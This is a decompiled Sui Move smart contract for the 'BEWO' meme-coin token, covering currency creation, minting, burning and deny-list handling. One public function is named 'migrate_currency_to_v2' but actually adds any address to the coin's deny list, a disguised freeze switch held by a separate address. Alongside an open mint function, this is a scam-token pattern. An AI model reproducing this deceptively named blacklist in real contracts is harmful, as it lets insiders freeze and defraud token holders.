module 0x29cb8beaebcfc3a36fa5a316e8655b87c7a10b9762dca4b006ce5f8681c51066::bewo {
    struct BEWO has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<BEWO>, arg1: 0x2::coin::Coin<BEWO>) {
        0x2::coin::burn<BEWO>(arg0, arg1);
    }

    fun init(arg0: BEWO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BEWO>(arg0, 9, b"BEWO", b"Blue Eyes White Omnicat", b"Bewo was used for experiments by Sui scientists, now he roams free.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/CZjkgMmQBDzNq5XWwXR2vUER2WxCeB7MVwsKeZ9Ypump.png?size=xl&key=ce3f44")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BEWO>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BEWO>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<BEWO>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BEWO>>(v1, @0x7211bebee82f23d66bff0395ff7a238eeff4ae6572e17c243d7ca1fc70e5e13f);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BEWO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BEWO>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<BEWO>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<BEWO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

